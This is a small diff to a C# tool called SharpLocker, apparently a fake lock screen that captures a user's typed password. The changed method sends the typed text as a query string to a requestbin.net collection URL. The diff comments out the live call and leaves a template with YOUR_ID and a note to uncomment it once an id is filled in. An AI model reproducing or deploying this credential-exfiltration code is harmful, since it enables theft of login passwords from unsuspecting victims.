@@ -182,8 +182,9 @@ namespace SharpLocker
 
         private void sendTexbyHTTP(string tBoxText)
         {
-            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://requestbin.net/r/1cqzjno1?" + tBoxText);
-            request.GetResponse();
+            //=== uncomment this lines after put you corret id ===
+            //HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://requestbin.net/r/YOUR_ID?" + tBoxText);
+            //request.GetResponse();
         }
 
         protected override CreateParams CreateParams
